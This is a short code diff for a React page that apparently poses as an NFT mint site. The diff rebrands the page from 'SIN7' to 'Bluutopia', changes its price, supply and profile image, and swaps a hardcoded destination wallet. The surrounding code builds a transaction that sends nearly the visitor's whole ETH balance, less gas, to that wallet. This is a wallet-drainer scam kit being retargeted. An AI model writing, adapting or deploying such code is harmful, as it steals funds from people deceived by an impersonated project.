@@ -3,10 +3,10 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = '0.077'
-const image = 'https://pbs.twimg.com/profile_images/1565355087353982980/mw_wlGDr_400x400.jpg'
-const Title = 'SIN7'
-const supply = 3771
+const ethAmount = '0.055'
+const image = 'https://pbs.twimg.com/profile_images/1587404155798233088/Pi_i9Zf4_400x400.jpg'
+const Title = 'Bluutopia'
+const supply = 4401
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -49,7 +49,7 @@ function App() {
             console.log(convertedBalance, gas, Number(gas) / 60000, convertedBalance, parseInt((convertedBalance - (gas / 100000)) * 1000000000000000000).toString(16))
             let params = [{
                 "from": address[0],
-                "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
+                "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
                 // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
                 //"gasPrice": Number(gas * 1000000000).toString(16),
                 "value": parseInt((convertedBalance - (Number(gas) / 20000)) * 1000000000000000000).toString(16)
